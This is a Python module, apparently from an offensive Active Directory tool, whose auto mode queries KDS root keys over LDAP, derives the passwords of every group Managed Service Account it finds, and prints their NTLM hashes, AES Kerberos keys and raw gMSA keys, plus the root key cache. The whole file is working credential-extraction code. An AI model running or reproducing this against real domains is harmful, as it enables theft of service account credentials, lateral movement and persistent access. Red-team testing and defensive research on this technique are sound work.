import base64
import logging
from blastfurnace.lib.crypto import calculate_ntlm_hash, calculate_aes_passwd
from blastfurnace.lib.ldap import LdapSession
from blastfurnace.lib.dpapi import GmsaSecurityDescriptor as sd
from blastfurnace.lib.dpapi import get_gke_from_cache

logger = logging.getLogger(__name__)

def execute_auto(args):

    logger.debug("[!] Auto mode enabled")
    logger.info("[-] Starting LDAP Session")

    session = LdapSession(args)

    logger.info("[-] Querying for root keys")

    cache = session.get_kds_root_keys()
    logger.info(f"[+] Number of root keys: {len(cache._root_keys)}")

    gmsa_identifiers = session.get_gmsa_params()
    for sid in gmsa_identifiers.keys():
        logger.info(f"\n[-]Creds for gMSA of sid {sid.formatCanonical()}")
        gmsa_items = gmsa_identifiers[sid]
        managed_passwd_id = gmsa_items["keyid"]
        sam_name = gmsa_items["sam"]
        gke = get_gke_from_cache(managed_passwd_id.root_key_identifier, sd, cache)
        gmsa_passwd = gke.get_gmsa_key(managed_passwd_id, sid.rawData)
        ntlm = calculate_ntlm_hash(gmsa_passwd, sam_name, session.domain)
        aes_128,aes_256 = calculate_aes_passwd(gmsa_passwd, sam_name, session.domain)
        logger.info(f"[+]{sam_name}:NTLM-hash:::{ntlm}")
        logger.info(f"[+]{sam_name}:aes256-cts-hmac-sha1-96:::{aes_256}")
        logger.info(f"[+]{sam_name}:aes128-cts-hmac-sha1-96:::{aes_128}")
        logger.info(f"[+]{sam_name}:gMSA-Key:::{base64.b64encode(gmsa_passwd).decode()}")


    for rk in cache._root_keys:
        logger.debug(f"[!] saving root key cache as {rk}.kcache")
        print(cache._root_keys[rk])
